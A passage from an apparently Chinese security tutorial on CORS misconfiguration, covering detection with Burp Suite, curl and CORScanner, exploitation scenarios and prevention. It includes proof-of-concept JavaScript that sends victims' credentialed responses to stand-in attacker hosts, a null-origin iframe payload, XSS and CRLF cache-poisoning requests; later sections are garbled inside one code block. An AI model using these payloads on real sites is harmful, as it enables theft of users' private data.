class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;<br>这段代码的作用是将 this.responseText 的内容设置为具有 id &quot;demo&quot; 的元素的内部 HTML。<br><br>具体解释如下：<br><br>document.getElementById(&quot;demo&quot;) 是一个 DOM 方法，它通过元素的 id 属性获取对应的 HTML 元素。在这个例子中，它获取具有 id &quot;demo&quot; 的元素。<br><br>.innerHTML 是获取或设置 HTML 元素的内部 HTML 内容的属性。通过将等号右侧的值赋给它，可以更新元素的内部 HTML 内容。<br>this.responseText 是 XMLHttpRequest 对象的属性，它包含从服务器返回的响应文本。<br><br>因此，这行代码的作用是将服务器返回的响应文本（this.responseText）设置为具有 id &quot;demo&quot; 的元素的内部 HTML 内容。这样，在网页中具有 id &quot;demo&quot; 的元素会显示服务器返回的文本内容。<br></code></pre></td></tr></table></figure>
<p>访问这个页面就可以获取已登录的用户的信息</p>
<p class='item-img' data-src='image-20230508155432545.png'><img src="image-20230508155432545.png" alt="image-20230508155432545"></p>
<p>该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。</p>
<h2 id="0x07-漏洞发现技巧"><a href="#0x07-漏洞发现技巧" class="headerlink" title="0x07-漏洞发现技巧"></a>0x07 漏洞发现技巧</h2>
<p>在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，<br>
CORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。</p>
<h5 id="方式一-BurpSuite"><a href="#方式一-BurpSuite" class="headerlink" title="方式一-BurpSuite"></a>方式一: BurpSuite</h5>
<p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。<br>
<strong>方式一: 首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。</strong></p>
<p class='item-img' data-src='image-20230510210647354.png'><img src="image-20230510210647354.png" alt="image-20230510210647354"></p>
<p><strong>在Filter by search term 中输入：Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="http://foo.example.org">foo.example.org</a></strong></p>
<p class='item-img' data-src='image-20230510210756718.png'><img src="image-20230510210756718.png" alt="image-20230510210756718"></p>
<p><strong>HTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。</strong></p>
<p class='item-img' data-src='image-20230510210834463.png'><img src="image-20230510210834463.png" alt="image-20230510210834463"></p>
<p>组合应是这种：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">foo.example.org</span><br><span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
<p>注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">*</span><br><span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
<p>当我们进行测试时，看服务器响应头字段里可以关注这几个点：<br>
<code>最好利用的配置：</code><br>
Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="https://attacker.com/">https://attacker.com</a><br>
Access-Control-Allow-Credentials: true<br>
<code>可能存在可利用的配置：</code><br>
Access-Control-Allow-Origin: null<br>
Access-Control-Allow-Credentials: true<br>
<code>很好的条件但无法利用：</code><br>
下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线<br>
Access-Control-Allow-Origin: *<br>
Access-Control-Allow-Credentials: true<br>
<code>单一的情况</code></p>
<h5 id="方式二-Access-Control-Allow-Origin："><a href="#方式二-Access-Control-Allow-Origin：" class="headerlink" title="方式二-Access-Control-Allow-Origin："></a>方式二: Access-Control-Allow-Origin：</h5>
<p>curl命令，输入<code>curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H &quot;Origin:https://example.com/&quot; -I</code></p>
<p class='item-img' data-src='image-20230510211118635.png'><img src="image-20230510211118635.png" alt="image-20230510211118635"></p>
<p>如果出现这种组合，说明存在CORS漏洞</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">foo.example.org</span><br><span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
<h5 id="方式三-使用CORScanner工具-漏洞自动化扫描"><a href="#方式三-使用CORScanner工具-漏洞自动化扫描" class="headerlink" title="方式三-使用CORScanner工具-漏洞自动化扫描"></a>方式三: 使用CORScanner工具(漏洞自动化扫描)</h5>
<p>github上提供了一个关于扫描CORS配置漏洞的脚本<br>
<a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a><br>
CORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。</p>
<p class='item-img' data-src='image-20230510211631525.png'><img src="image-20230510211631525.png" alt="image-20230510211631525"></p>
<p><strong>总结漏洞的原因：</strong><br>
1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。<br>
2：有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。</p>
<p><strong>安全隐患</strong><br>
这个流程中。服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。所以从某种程度上来说。在支持CORS的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。</p>
<p>如果将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么CORS的安全机制几乎就无效了。但是这里在设计的时候有一个很好的限制。xmlhttprequest发送的请求需要使用“withCredentials”来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。<strong>（就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。</strong></p>
<h2 id="0x08-其他可能利用漏洞的地方"><a href="#0x08-其他可能利用漏洞的地方" class="headerlink" title="0x08-其他可能利用漏洞的地方"></a>0x08 其他可能利用漏洞的地方</h2>
<h4 id="8-1-解析Origin头时出错"><a href="#8-1-解析Origin头时出错" class="headerlink" title="8-1-解析Origin头时出错"></a>8.1 解析Origin头时出错</h4>
<p>一些支持从多个来源进行访问的应用程序通过使用允许的来源白名单来实现。收到CORS请求后，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它会反映在Access-Control-Allow-Origin标题中，以便授予访问权限。例如，web应用收到一个正常的请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /data HTTP/1.1<br>Host: bar.com<br>...<br>Origin: https://example.com<br></code></pre></td></tr></table></figure>
<p>web应用根据其允许的来源列表检查当前请求资源的来源，如果在列表中，则按以下方式反映该来源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HTTP/1.1 200 OK<br>...<br>Access-Control-Allow-Origin: https://example.com<br></code></pre></td></tr></table></figure>
<p>但在检测来源是否存在于白名单时经常可能出现问题，一些网站可能会允许其所有的子域（包括尚未存在未来可能存在的子域）来进行访问，或者允许其他网站的域以及其子域来访问请求。这些请求一般都通过通配符或者正则表达式来完成，但是如果这其中出现错误可能就会导致给予其他未被授权的域访问权限。例如：<br>
例如，假设一个应用程序授予对以下列结尾的所有域的访问权限：<br>
<a href="http://example.com">example.com</a><br>
攻击者可能可以通过注册域来获得访问权限：<br>
<a target="_blank" rel="noopener" href="http://exeexample.com">exeexample.com</a><br>
或者，假设应用程序授予对所有以example.com开头的域访问权限，攻击者就可以使用该域获得访问权限：<br>
<a target="_blank" rel="noopener" href="http://example.com.evil-user.net">example.com.evil-user.net</a></p>
<h4 id="8-2-利用相互受CORS信任的域来进行XSS"><a href="#8-2-利用相互受CORS信任的域来进行XSS" class="headerlink" title="8-2-利用相互受CORS信任的域来进行XSS"></a>8.2 利用相互受CORS信任的域来进行XSS</h4>
<p>假如两个互相受信任的源，如果其中一个网站存在XSS，攻击者就可以利用XSS注入一些JavaScript代码，利用这些代码对信任其源的另一个网站进行敏感信息的获取。<br>
如果进行CORS请求时网站响应：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HTTP/1.1 200 OK<br>Access-Control-Allow-Origin: https://vulnerable.com<br>Access-Control-Allow-Credentials: true<br></code></pre></td></tr></table></figure>
<p>就可以利用XSS漏洞在vulnerable.com网站上使用下面的URL来通过检索API密钥：<br>
<code>https://vulnerable.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;</code></p>
<h4 id="8-3-白名单中的null值"><a href="#8-3-白名单中的null值" class="headerlink" title="8-3-白名单中的null值"></a>8.3 白名单中的null值</h4>
<p>CORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在RFC 6564中被定义。RFC 6564规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。</p>
<p>CORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示：<br>
Access-Control-Allow-Origin: null<br>
Access-Control-Allow-Credentials: true<br>
在这种情况下，攻击者可以使用各种技巧来生成跨域请求，该请求构造的Origin为null值。这将满足白名单的要求，从而导致跨域访问。例如，可以使用iframe以下格式的沙盒跨域请求来完成：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> src=<span class="hljs-string">&quot;data:text/html,&lt;script&gt;</span><br><span class="hljs-string">var req = new XMLHttpRequest();</span><br><span class="hljs-string">req.onload = reqListener();</span><br><span class="hljs-string">req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true);</span><br><span class="hljs-string">req.withCredentials = true;</span><br><span class="hljs-string">req.send();</span><br><span class="hljs-string"></span><br><span class="hljs-string">function reqListener() &#123;</span><br><span class="hljs-string">location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText;</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&lt;/script&gt;&quot;</span>&gt;<br>&lt;/iframe&gt;<br></code></pre></td></tr></table></figure>
<p>这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials:true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
<h2 id="0x09-利用CORS漏洞-偏实际环境"><a href="#0x09-利用CORS漏洞-偏实际环境" class="headerlink" title="0x09-利用CORS漏洞-偏实际环境"></a>0x09 利用CORS漏洞(偏实际环境)</h2>
<p>流程:</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://xn--CORSvuln-z09lrnj2rtqnu49bydof43c9oejpwl4szpaf74reoya6hy.com">假设用户登陆一个含有CORS配置网站vuln.com</a>，<a target="_blank" rel="noopener" href="http://xn--evil-k84fui0wi3eluix9emvas11m4pa17nc6ct30ix07a1d7bhzxb45d.com">同时又访问了攻击者提供的一个链接evil.com</a>。</li>
<li>evil.com的网站向vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于vuln.com的配置。</li>
<li>如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。</li>
</ol>
<h4 id="方式一：存在用户凭证"><a href="#方式一：存在用户凭证" class="headerlink" title="方式一：存在用户凭证"></a>方式一：存在用户凭证</h4>
<p class='item-img' data-src='image-20230510212141252.png'><img src="image-20230510212141252.png" alt="image-20230510212141252"></p>
<p><strong>详细过程</strong></p>
<ol>
<li>
<p>创建一个JavaScript脚本去发送CORS请求，poc关键代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><code class="hljs js">   <span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); <br>   req.<span class="hljs-property">onload</span> = <span class="hljs-title function_">reqListener</span>(); <br>   req.<span class="hljs-title function_">open</span>(“get”,”<span class="hljs-attr">https</span>:<span class="hljs-comment">//vulnerable.domain/api/private-data”,true); </span><br>   req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br>   req.<span class="hljs-title function_">send</span>(); <br>   <span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) &#123; <br>   location=”<span class="hljs-comment">//attacker.domain/log?response=”+this.responseText; </span><br>   &#125;;<br><br><span class="hljs-number">2.</span> 当带有目标系统的用户访问的主机访问上述代码的页面时，浏览器就会发送下面的请求到存在<span class="hljs-variable constant_">CORS</span>配置的服务器。<br><br><span class="hljs-string">``</span><span class="hljs-string">`http</span><br><span class="hljs-string">GET /api/private-data HTTP/1.1 </span><br><span class="hljs-string">Host: vulnerable.domain </span><br><span class="hljs-string">Origin: https://attacker.domain/ </span><br><span class="hljs-string">Cookie: JSESSIONID=&lt;redacted&gt;</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br><span class="hljs-number">3.</span> 响应包<br><br><span class="hljs-string">``</span><span class="hljs-string">`http</span><br><span class="hljs-string">HTTP/1.1 200 OK </span><br><span class="hljs-string">Server: Apache-Coyote/1.1 </span><br><span class="hljs-string">Access-Control-Allow-Origin: https://attacker.domain </span><br><span class="hljs-string">Access-Control-Allow-Credentials: true </span><br><span class="hljs-string">Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials </span><br><span class="hljs-string">Vary: Origin </span><br><span class="hljs-string">Expires: Thu, 01 Jan 1970 12:00:00 GMT </span><br><span class="hljs-string">Last-Modified: Wed, 02 May 2018 09:07:07 GMT </span><br><span class="hljs-string">Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 </span><br><span class="hljs-string">Pragma: no-cache </span><br><span class="hljs-string">Content-Type: application/json;charset=ISO-8859-1 </span><br><span class="hljs-string">Date: Wed, 02 May 2018 09:07:07 GMT </span><br><span class="hljs-string">Connection: close </span><br><span class="hljs-string">Content-Length: 149 &#123;&quot;id&quot;:1234567,&quot;name&quot;:&quot;Name&quot;,&quot;surname&quot;:&quot;Surname&quot;,&quot;email&quot;:&quot;email@target.local&quot;,&quot;account&quot;:&quot;ACT1234567&quot;,&quot;balance&quot;:&quot;123456,7&quot;,&quot;token&quot;:&quot;to p-secret-string&quot;&#125;</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br><span class="hljs-number">3.</span> 因为服务器发送了右边的“ <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>- *”给客户端，所以，攻击的浏览器允许包含恶意的<span class="hljs-title class_">JavaScript</span>代码的页面访问用户的隐私数据。<br><br>#### 方式二：不存在用户凭证<br><br>![image-<span class="hljs-number">20230510212310583</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510212310583.</span>png)<br><br>**详细过程**<br><br><span class="hljs-number">1.</span> 攻击方式<span class="hljs-number">1</span>：绕过基于<span class="hljs-variable constant_">IP</span>的认证<br>   如果目标应用程序与受害者的网络可达性，并且目标应用程序使用<span class="hljs-variable constant_">IP</span>地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于<span class="hljs-variable constant_">IP</span>的身份验证。<br><span class="hljs-number">2.</span> 攻击方式<span class="hljs-number">2</span>：客户端缓存中毒<br>   例如，数据报文头部中包含<span class="hljs-string">`X-User`</span>标头，其值未进行任何输入验证，输出编码。<br>   请求包<br><br><span class="hljs-string">``</span><span class="hljs-string">`http</span><br><span class="hljs-string">GET /login HTTP/1.1 </span><br><span class="hljs-string">Host: www.target.local </span><br><span class="hljs-string">Origin: https://attacker.domain/ </span><br><span class="hljs-string">X-User: &lt;svg/onload=alert(1)&gt;</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>响应包<br><span class="hljs-string">`Access-Control-Allow-Origin`</span>已被设置，<span class="hljs-string">`Access-Control-Allow-Credentials: true`</span>与<span class="hljs-string">`Vary: Origin`</span>头适合设置<br><br><span class="hljs-string">``</span><span class="hljs-string">`http</span><br><span class="hljs-string">HTTP/1.1 200 OK </span><br><span class="hljs-string">Access-Control-Allow-Origin: https://attacker.domain/ </span><br><span class="hljs-string">… </span><br><span class="hljs-string">Content-Type: text/html </span><br><span class="hljs-string">… </span><br><span class="hljs-string">Invalid user: &lt;svg/onload=alert(1)&gt;</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>构造存在恶意的<span class="hljs-variable constant_">XSS</span>有效负载页面，诱使受害者触发。<br><br><span class="hljs-string">``</span><span class="hljs-string">`JavaScript</span><br><span class="hljs-string">var req = new XMLHttpRequest(); </span><br><span class="hljs-string">req.onload = reqListener;</span><br><span class="hljs-string">req.open(&#x27;get&#x27;,&#x27;http://www.target.local/login&#x27;,true); </span><br><span class="hljs-string">req.setRequestHeader(&#x27;X-User&#x27;, &#x27;&lt;svg/onload=alert(1)&gt;&#x27;);</span><br><span class="hljs-string">req.send(); </span><br><span class="hljs-string">function reqListener() &#123; </span><br><span class="hljs-string">location=&#x27;http://www.target.local/login&#x27;; </span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br><span class="hljs-number">1.</span> 攻击方式<span class="hljs-number">3</span>：服务器端缓存中毒<br>   利用<span class="hljs-variable constant_">CORS</span>的错误配置注入任意<span class="hljs-variable constant_">HTTP</span>头部，将其保存在服务器端缓存中，可用于构造存储类型<span class="hljs-variable constant_">XSS</span>。<br>   利用条件：存在服务器端缓存，能够反射<span class="hljs-string">`Origin`</span>头部，不会检查<span class="hljs-string">`Origin`</span>头部中的特殊字符，如<span class="hljs-string">`\r`</span><br>   利用方式：攻击<span class="hljs-variable constant_">IE</span> / <span class="hljs-title class_">Edge</span>用户（<span class="hljs-variable constant_">IE</span> / <span class="hljs-title class_">Edge</span>使用<span class="hljs-string">`\r`</span>作为的<span class="hljs-variable constant_">HTTP</span>标题段的终结符）<br><br>请求包<br><br><span class="hljs-string">``</span><span class="hljs-string">`http</span><br><span class="hljs-string">GET / HTTP/1.1 </span><br><span class="hljs-string">Origin: z[0x0d]Content-Type: text/html; charset=UTF-7</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>回车（<span class="hljs-variable constant_">CR</span>）：<span class="hljs-variable constant_">ASCII</span>码：<span class="hljs-string">&#x27;\r&#x27;</span> ，十六进制：<span class="hljs-number">0x0d</span><br><br>响应包<br><br><span class="hljs-string">``</span><span class="hljs-string">`http</span><br><span class="hljs-string">HTTP/1.1 200 OK </span><br><span class="hljs-string">Access-Control-Allow-Origin: z </span><br><span class="hljs-string">Content-Type: text/html; charset=UTF-7</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>如果攻击者能提前发送畸形的<span class="hljs-string">`Origin`</span>消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为<span class="hljs-string">`UTF-7`</span>，可引发<span class="hljs-variable constant_">XSS</span>中断。<br><br>#### 类型<span class="hljs-number">2</span><br><br><span class="hljs-number">1.</span>描述<br><br>在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。<br><br><span class="hljs-number">2.</span>挖掘<br><br>同上<br><br><span class="hljs-number">3.</span>利用<br><br><span class="hljs-number">1</span>,交互式xss。通过<span class="hljs-variable constant_">CORS</span>，绕过一些反会话劫持的方法，如<span class="hljs-variable constant_">HTTP</span>-<span class="hljs-title class_">Only</span>限制的cookie，绑定<span class="hljs-variable constant_">IP</span>地址的会话<span class="hljs-variable constant_">ID</span>等，劫持用户会话。<br><br><span class="hljs-number">2</span>,程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。<br><br>## <span class="hljs-number">0x10</span> 预防<span class="hljs-variable constant_">CORS</span>漏洞<br><br><span class="hljs-variable constant_">CORS</span>漏洞主要是由于配置错误而引起的。所以，预防漏洞变成了一个配置问题。下面介绍了一些针对<span class="hljs-variable constant_">CORS</span>攻击的有效防御措施。<br><br><span class="hljs-number">1.</span> 正确配置跨域请求<br>   如果<span class="hljs-title class_">Web</span>资源包含敏感信息，则应在<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>标头中正确指定来源。<br><span class="hljs-number">2.</span> 只允许信任的网站<br>   看起来似乎很明显，但是<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>中指定的来源只能是受信任的站点。特别是，使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用，应该避免。<br><span class="hljs-number">3.</span> 避免将<span class="hljs-literal">null</span>列入白名单<br>   避免使用标题<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: <span class="hljs-literal">null</span>。来自内部文档和沙盒请求的跨域资源调用可以指定<span class="hljs-literal">null</span>来源。应针对私有和公共服务器的可信来源正确定义<span class="hljs-variable constant_">CORS</span>头。<br><span class="hljs-number">4.</span> 避免在内部网络中使用通配符<br>   避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。<br><span class="hljs-number">5.</span> <span class="hljs-variable constant_">CORS</span>不能替代服务器端安全策略<br>   <span class="hljs-variable constant_">CORS</span>定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的<span class="hljs-variable constant_">CORS</span>之外，<span class="hljs-title class_">Web</span>服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。<br><br>## <span class="hljs-number">0x11</span> <span class="hljs-variable constant_">CORS</span>靶场练习<br><br>该靶场内置了<span class="hljs-number">3</span>个 <span class="hljs-variable constant_">CORS</span> 的漏洞场景<br><br>- 场景一：信任任意 <span class="hljs-title class_">Origin</span> 源<br>- 场景二：正则表达式检测 <span class="hljs-title class_">Origin</span> 源<br>- 场景三：信任任意 <span class="hljs-literal">null</span> 源![image-<span class="hljs-number">20230510214108156</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510214108156.</span>png)<br><br> 漏洞检测: 一般情况下，修改请求包 <span class="hljs-title class_">Header</span> 中的 <span class="hljs-title class_">Origin</span> 字段为任意域名或者为 <span class="hljs-literal">null</span> 